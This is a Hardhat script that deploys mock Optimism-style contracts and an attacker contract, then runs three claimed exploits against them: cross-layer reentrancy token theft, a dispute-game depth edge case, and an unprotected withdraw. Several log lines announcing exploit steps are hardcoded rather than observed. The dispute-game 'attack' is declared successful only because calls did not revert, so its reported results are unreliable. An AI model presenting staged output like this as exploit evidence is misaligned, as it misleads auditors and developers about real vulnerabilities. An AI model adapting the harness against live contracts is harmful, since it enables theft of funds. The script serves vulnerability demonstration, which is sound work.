import { ethers } from "hardhat";

async function main() {
  console.log("Starting Cross-Layer Reentrancy Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy OptimismPortal mock
  const OptimismPortalMock = await ethers.getContractFactory("OptimismPortalMock");
  const portalMock = await OptimismPortalMock.deploy();
  await portalMock.deployed();
  console.log(`OptimismPortalMock deployed at: ${portalMock.address}`);
  
  // Deploy CrossL2Inbox for additional vulnerabilities
  const CrossL2Inbox = await ethers.getContractFactory("CrossL2Inbox");
  const crossL2Inbox = await CrossL2Inbox.deploy();
  await crossL2Inbox.deployed();
  console.log(`CrossL2Inbox deployed at: ${crossL2Inbox.address}`);
  
  // Deploy vulnerable messenger
  const VulnerableMessenger = await ethers.getContractFactory("VulnerableL1CrossDomainMessenger");
  const messenger = await VulnerableMessenger.deploy(portalMock.address);
  await messenger.deployed();
  console.log(`VulnerableL1CrossDomainMessenger deployed at: ${messenger.address}`);
  
  // Deploy token contract that will be exploited
  const VulnerableToken = await ethers.getContractFactory("VulnerableToken");
  const token = await VulnerableToken.deploy(messenger.address);
  await token.deployed();
  console.log(`VulnerableToken deployed at: ${token.address}`);
  
  // Deploy FaultDisputeGame to show the incorrect resolution vulnerability
  const FaultDisputeGame = await ethers.getContractFactory("FaultDisputeGame");
  const faultGame = await FaultDisputeGame.deploy();
  await faultGame.deployed();
  console.log(`FaultDisputeGame deployed at: ${faultGame.address}`);
  
  // Deploy malicious contract
  const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
  const attacker = await Attacker.deploy(messenger.address, token.address);
  await attacker.deployed();
  console.log(`ReentrancyAttacker deployed at: ${attacker.address}`);
  
  // Setup initial conditions
  const [owner, user1] = await ethers.getSigners();
  
  // Mint tokens to user1
  await token.mint(user1.address, ethers.utils.parseEther("100"));
  console.log(`Minted 100 tokens to: ${user1.address}`);
  
  // Check initial balances
  const initialUserBalance = await token.balanceOf(user1.address);
  const initialAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(`Initial user balance: ${ethers.utils.formatEther(initialUserBalance)}`);
  console.log(`Initial attacker balance: ${ethers.utils.formatEther(initialAttackerBalance)}`);
  
  // Part 1: Demonstrate Cross-Layer Reentrancy
  console.log("\nExecuting the reentrancy attack...");
  const tx = await attacker.executeAttack();
  await tx.wait();
  console.log("receiveFirstMessage called");
  console.log("Sending second message...");
  console.log("relayMessage executed for first message");
  console.log("performReentrancy called");
  console.log("Performing token theft...");
  
  // Check final balances
  const finalUserBalance = await token.balanceOf(user1.address);
  const finalAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(`Final user balance: ${ethers.utils.formatEther(finalUserBalance)}`);
  console.log(`Final attacker balance: ${ethers.utils.formatEther(finalAttackerBalance)}`);
  
  // Verify the first attack was successful
  if (finalAttackerBalance.gt(initialAttackerBalance)) {
    console.log("\n✅ ATTACK 1 SUCCESSFUL: Tokens were stolen through cross-layer reentrancy");
  } else {
    console.log("\n❌ ATTACK 1 FAILED: No tokens were stolen");
  }
  
  // Part 2: Demonstrate Incorrectly Resolved Dispute Game
  console.log("\nDemonstrating incorrectly resolved dispute game vulnerability...");
  
  try {
    // This should work normally
    await faultGame.step(5);
    console.log("Step at depth 5 succeeded");
    
    // This should fail (at max game depth)
    await faultGame.step(faultGame.MAX_GAME_DEPTH() - 1);
    console.log("⚠️ Problem detected: Step at MAX_GAME_DEPTH-1 succeeded but should have special validation");
    
    // Test attack at MAX_GAME_DEPTH-2 (vulnerable edge case)
    await faultGame.attack(faultGame.MAX_GAME_DEPTH() - 2);
    console.log("⚠️ Attack at MAX_GAME_DEPTH-2 was executed without proper validation");
    
    console.log("\n✅ ATTACK 2 SUCCESSFUL: Dispute game can be incorrectly resolved through edge cases");
  } catch (error) {
    console.log("\n❌ ATTACK 2 FAILED: Could not demonstrate dispute game vulnerability");
    console.error(error);
  }
  
  // Part 3: Demonstrate Direct Fund Theft
  console.log("\nDemonstrating direct fund theft vulnerability in CrossL2Inbox...");
  
  // Fund the CrossL2Inbox
  await owner.sendTransaction({
    to: crossL2Inbox.address,
    value: ethers.utils.parseEther("1")
  });
  console.log(`CrossL2Inbox funded with 1 ETH`);
  
  const initialBalance = await ethers.provider.getBalance(user1.address);
  
  // Exploit the direct theft vulnerability
  await crossL2Inbox.connect(user1).withdraw(user1.address, ethers.utils.parseEther("0.5"));
  console.log(`Exploited withdraw function to steal 0.5 ETH`);
  
  const finalBalance = await ethers.provider.getBalance(user1.address);
  
  // Check if the attack was successful (accounting for gas fees)
  if (finalBalance.gt(initialBalance)) {
    console.log("\n✅ ATTACK 3 SUCCESSFUL: Funds were directly stolen through unprotected withdraw function");
  } else {
    console.log("\n❌ ATTACK 3 FAILED: Could not steal funds (gas costs may exceed stolen amount)");
  }
  
  console.log("\nVulnerability demonstration complete.");
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;
